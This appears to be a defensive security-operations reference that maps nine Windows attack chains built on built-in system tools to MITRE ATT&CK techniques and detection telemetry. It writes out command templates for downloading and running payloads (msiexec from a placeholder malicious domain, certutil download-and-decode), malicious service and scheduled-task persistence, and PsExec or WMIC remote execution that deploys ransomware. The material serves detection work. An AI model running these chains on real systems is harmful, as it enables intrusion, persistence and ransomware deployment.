Behavioural Attack Chains per LOLBin (with Detailed Reasoning)

Here are solid, realistic chains you’ll see in SOC work. Each has:

ASCII chain

Typical use in the wild

Tactics/techniques

Telemetry to pivot to

Why attackers like it

Chain 1 — Phishing Doc → Macro → PowerShell Loader → C2
outlook.exe
  └─ winword.exe (macro-enabled doc)
       └─ powershell.exe (encoded stager)
            └─ (optional) rundll32.exe or child payload
                 └─ C2 beacons (http/https)


Context / Reasoning

Initial Access: T1566.001 (spearphishing attachment)

Execution: T1059.001 (PowerShell), T1204 (User execution)

C2 / Discovery: T1105, T1082

Attackers love this because:

They get a full interpreter (PS) from a single macro.

Can run obfuscated, encoded scripts (e.g. -enc + base64).

Can load C# in-memory, talk to C2, drop no files.

Key telemetry & pivots:

DeviceProcessEvents: parent=winword.exe, child=powershell.exe

DeviceNetworkEvents: suspicious outbound from that PS process

DeviceFileEvents: any dropped EXEs/DLLs from PS

ThreatIntelligenceIndicator: domains/IPs seen

Chain 2 — HTML Smuggling → MSHTA → PowerShell → Payload
outlook.exe / browser (chrome.exe/msedge.exe)
  └─ winword.exe or browser rendering HTML/JS
       └─ mshta.exe (remote .hta / javascript: / vbscript:)
            └─ powershell.exe (download + execute)
                 └─ droppedpayload.exe
                      └─ network beacon / ransomware / RAT


Context / Reasoning

Initial Access: HTML smuggling via doc/email/link

Execution: T1218.005 (Mshta), T1059.001 (PowerShell)

C2: T1105

Why attackers love it:

mshta.exe is signed and trusted.

They can host .hta remotely and change it at will.

HTML/JS obfuscation is trivial, detection is harder at network layer.

Telemetry:

DeviceProcessEvents: mshta parent = Word/browser; PS child of mshta

DeviceNetworkEvents: mshta → remote URL, PS → C2

DeviceFileEvents: artifact writes into %TEMP%, %APPDATA%.

Chain 3 — Script Dropper → WScript/CScript → PowerShell → Scheduled Task Persistence
outlook.exe
  └─ winword.exe
       └─ wscript.exe (malicious .vbs or .js)
            └─ powershell.exe (stager)
                 └─ schtasks.exe /create /SC minute /TR <payload>


Tactics / Techniques

T1059.005 (wscript/cscript)

T1059.001 (PowerShell)

T1053.005 (Scheduled Task)

T1547 (Persistence)

Why it’s common:

Attackers want persistence that survives reboot and user logoff.

Tasks are easy to hide, especially with obscure names and paths.

Travel well across environments and are easy to script.

Telemetry:

DeviceProcessEvents: Word → wscript → PowerShell → schtasks

DeviceEvents / SecurityEvent: new task created

DeviceFileEvents: task target binary.

Chain 4 — MSI Loader → Malicious DLL via Rundll32
browser.exe / outlook.exe
  └─ msiexec.exe /i https://bad[.]domain/payload.msi /qn
       └─ rundll32.exe <malicious.dll>,ExportFunc
            └─ payload.exe or in-memory shellcode
                 └─ C2 / lateral movement / staging


Why attackers like it:

MSI is a “normal” installer container with both EXE & DLL inside.

msiexec.exe is a trusted signed binary.

Rundll32 is designed to execute DLL exports.

MITRE:

T1218.007 (Msiexec)

T1218.011 (Rundll32)

T1055 (Code Injection / DLL)

Telemetry:

DeviceProcessEvents: msiexec parent = browser/office; rundll32 child

DeviceFileEvents: new DLLs in user paths; FileCreated → .dll

DeviceNetworkEvents: msiexec fetching from remote hosts.

Chain 5 — Certutil Download → Decode → Execute → C2
powershell.exe / cmd.exe
  └─ certutil.exe -urlcache -split -f http(s)://... payload.b64
       └─ certutil.exe -decode payload.b64 payload.exe
            └─ payload.exe
                 └─ C2 beacons / ransomware staging


MITRE:

T1105 – Ingress Tool Transfer

T1140 – Deobfuscate/Decode Files

T1041 – Exfil over C2 (if abused for export too)

Why they love it:

Used as “LOL” tool to avoid direct curl/Invoke-WebRequest detection.

Built-in decode pipeline means they can deliver base64 content.

Proxy/inspection may not flag it if misconfigured.

Telemetry:

DeviceProcessEvents: certutil with -urlcache and -decode

DeviceFileEvents: .b64 → .exe pipeline

DeviceNetworkEvents: certutil to suspicious domains.

Chain 6 — Service-Based Persistence with sc.exe + Malicious Binary
powershell.exe / dropper.exe
  └─ sc.exe create <svc_name> binPath= "<userdir>\svc.exe" start= auto
       └─ (on boot) services.exe
            └─ svc.exe (malicious service payload)
                 └─ C2 / lateral tools / encryption


MITRE:

T1543.003 (Windows Service)

T1569.002 (Service Execution)

Why attackers use it:

Survives reboot.

Runs under SYSTEM if misconfigured.

Many defenders only look at Run keys, not services.

Telemetry:

DeviceProcessEvents: sc.exe with create + suspicious binPath.

DeviceRegistryEvents: new HKLM\SYSTEM\CurrentControlSet\Services\<name>

DeviceFileEvents: service binary path.

Chain 7 — WMI/WMIC Recon + Remote Execution
powershell.exe / script.exe
  └─ wmic.exe /node:<target> process call create "cmd.exe /c <payload>"
       └─ target-host: cmd.exe
            └─ powershell.exe / payload.exe


MITRE:

T1047 – WMI Exec

T1021.006 – WMI Lateral Movement

Used for:

Quiet recon of remote hosts

Fileless-like remote execution

Lateral pivot without RDP / PsExec noise.

Telemetry:

DeviceProcessEvents: wmic with process call create

DeviceNetworkEvents: RPC/DCOM communication

SecurityEvent on target: new process / logon events.

Chain 8 — PsExec Lateral Movement + Ransomware
attacker-host.exe / script
  └─ psexec.exe \\target -s -d cmd.exe /c \\share\payload.exe
       └─ target: psexesvc.exe (service)
            └─ cmd.exe /c \\share\payload.exe
                 └─ payload.exe (ransomware)
                      └─ file encryption + shadow copy deletion


MITRE:

T1021.002 – SMB/Windows Admin Shares

T1569.002 – Service Execution

T1486 – Data Encrypted for Impact

Why common:

Classic technique in NotPetya, Ryuk, Conti, etc.

Low friction if ADMIN$ and credentials are available.

Telemetry:

DeviceNetworkEvents: port 445 connections from attacker to many hosts.

DeviceProcessEvents: psexec.exe launching psexesvc.exe; payload execution on targets.

SecurityEvent: service creation events (7045), logons from attacker account to many hosts.

Chain 9 — LOLBIN-Only, “Fileless-ish” Attack
phishing (Office doc)
  └─ winword.exe
       └─ wscript.exe / mshta.exe
            └─ powershell.exe (in-memory loader)
                 └─ rundll32.exe (reflective DLL injection)
                      └─ dllhost.exe (injected COM surrogate)
                           └─ C2 over HTTPS (no obvious custom binary on disk)


MITRE:

T1059 (multiple sub-techniques)

T1218.x (Mshta, Rundll32)

T1055 (Process Injection)

Reason:

As close to “fileless” as you’ll get with LOLBins only.

Very difficult to catch purely via signatures.

You MUST lean on ancestry + command-line + memory + network.

Telemetry Pivots:

DeviceProcessEvents: entire ancestry chain from Word down to dllhost.exe.

DeviceNetworkEvents: dllhost.exe / rundll32.exe making outbound connections.

ThreatIntelligenceIndicator: hostnames/IPs, JA3 fingerprinting if available.
